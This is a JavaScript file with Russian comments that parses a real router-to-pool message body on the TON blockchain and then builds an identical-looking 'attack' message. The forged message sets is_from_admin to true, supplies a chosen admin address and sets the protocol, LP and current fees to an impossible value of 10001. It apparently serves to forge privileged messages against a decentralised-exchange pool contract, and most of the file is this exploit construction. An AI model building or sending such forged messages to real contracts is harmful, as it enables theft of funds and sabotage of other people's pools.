const { Cell, Slice, Address, beginCell } = require('@ton/core');

// Возьмем hex body из успешной транзакции
// Это тело сообщения от роутера к пулу
const bodyHex = 'b5ee9c72010102010052000297441c39ed0000000000000000e00579e0493e14a7eb5eba90415a2fe8ba8c3b376580cd71c09a3690b531a5f225c0000000000000000000000000000000000000000000000009c449c449c46001010000';

const bodyCell = Cell.fromHex(bodyHex);
const slice = bodyCell.beginParse();

console.log('Разбор body роутера:');
console.log('Total bits:', slice.remainingBits);
console.log('Total refs:', slice.remainingRefs);

const op = slice.loadUint(32);
console.log('OP: 0x' + op.toString(16));

const queryId = slice.loadUint(64);
console.log('Query ID: 0x' + queryId.toString(16));

const isFromAdmin = slice.loadBit();
console.log('is_from_admin:', isFromAdmin);

const hasAdmin = slice.loadBit();
console.log('has_admin:', hasAdmin);

const admin = slice.loadAddress();
console.log('Admin:', admin.toString());

const hasController = slice.loadBit();
console.log('has_controller:', hasController);

const hasTickSpacing = slice.loadBit();
console.log('has_tickSpacing:', hasTickSpacing);

const hasSqrtPriceX96 = slice.loadBit();
console.log('has_sqrtPriceX96:', hasSqrtPriceX96);

const hasActivatePool = slice.loadBit();
console.log('has_activate_pool:', hasActivatePool);

console.log('\nОстаток бит:', slice.remainingBits);
console.log('Остаток рефов:', slice.remainingRefs);

// Теперь fees - их 3 по 16 бит
if (slice.remainingBits >= 48) {
    const protocolFee = slice.loadUint(16);
    const lpFee = slice.loadUint(16);
    const currentFee = slice.loadUint(16);
    console.log('\nprotocolFee:', protocolFee);
    console.log('lpFee:', lpFee);
    console.log('currentFee:', currentFee);
}

console.log('Бит после fees:', slice.remainingBits);
console.log('Рефов после fees:', slice.remainingRefs);

// Два рефа
if (slice.remainingRefs >= 1) {
    const ref1 = slice.loadRef();
    console.log('\nRef1 (nftContentPacked) bits:', ref1.bits.length);
    console.log('Ref1 refs:', ref1.refs.length);
}

if (slice.remainingRefs >= 1) {
    const ref2 = slice.loadRef();
    console.log('Ref2 (nftItemContentPacked) bits:', ref2.bits.length);
    console.log('Ref2 refs:', ref2.refs.length);
}

console.log('\nИТОГ: осталось бит:', slice.remainingBits);
console.log('ИТОГ: осталось рефов:', slice.remainingRefs);

console.log('\n==========');
console.log('Теперь давайте сформируем ТОЧНО ТАКОЕ ЖЕ сообщение для атаки:');
console.log('==========\n');

// Сформируем идентичное сообщение
const attackBody = beginCell()
    .storeUint(0x441c39ed, 32)
    .storeUint(0, 64)
    .storeUint(1, 1)  // is_from_admin = true
    .storeUint(1, 1)  // has_admin = true
    .storeAddress(Address.parse('UQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuLpT'))
    .storeUint(0, 1)  // has_controller = false
    .storeUint(0, 1)  // has_tickSpacing = false
    .storeUint(0, 1)  // has_sqrtPriceX96 = false
    .storeUint(0, 1)  // has_activate_pool = false
    // fees: protocolFee, lpFee, currentFee
    .storeUint(10001, 16)  // protocolFee = IMPOSSIBLE_FEE
    .storeUint(10001, 16)  // lpFee = IMPOSSIBLE_FEE
    .storeUint(10001, 16)  // currentFee = IMPOSSIBLE_FEE
    .storeRef(beginCell().endCell())  // nftContentPacked
    .storeRef(beginCell().endCell())  // nftItemContentPacked
    .endCell();

const attackSlice = attackBody.beginParse();
console.log('Наше сообщение:');
console.log('Total bits:', attackSlice.remainingBits);
console.log('Total refs:', attackSlice.remainingRefs);

const op2 = attackSlice.loadUint(32);
console.log('OP: 0x' + op2.toString(16));

const qid2 = attackSlice.loadUint(64);
console.log('Query ID: 0x' + qid2.toString(16));

const isFromAdmin2 = attackSlice.loadBit();
console.log('is_from_admin:', isFromAdmin2);

const hasAdmin2 = attackSlice.loadBit();
console.log('has_admin:', hasAdmin2);

const admin2 = attackSlice.loadAddress();
console.log('Admin:', admin2.toString());

const hasController2 = attackSlice.loadBit();
console.log('has_controller:', hasController2);

const hasTickSpacing2 = attackSlice.loadBit();
console.log('has_tickSpacing:', hasTickSpacing2);

const hasSqrtPriceX962 = attackSlice.loadBit();
console.log('has_sqrtPriceX96:', hasSqrtPriceX962);

const hasActivatePool2 = attackSlice.loadBit();
console.log('has_activate_pool:', hasActivatePool2);

console.log('\nОстаток бит:', attackSlice.remainingBits);
console.log('Остаток рефов:', attackSlice.remainingRefs);

// Сравним hex
console.log('\nHex body роутера:', bodyCell.toBoc().toString('hex'));
console.log('Hex body атаки:', attackBody.toBoc().toString('hex'));
console.log('Совпадают?', bodyCell.toBoc().toString('hex') === attackBody.toBoc().toString('hex'));
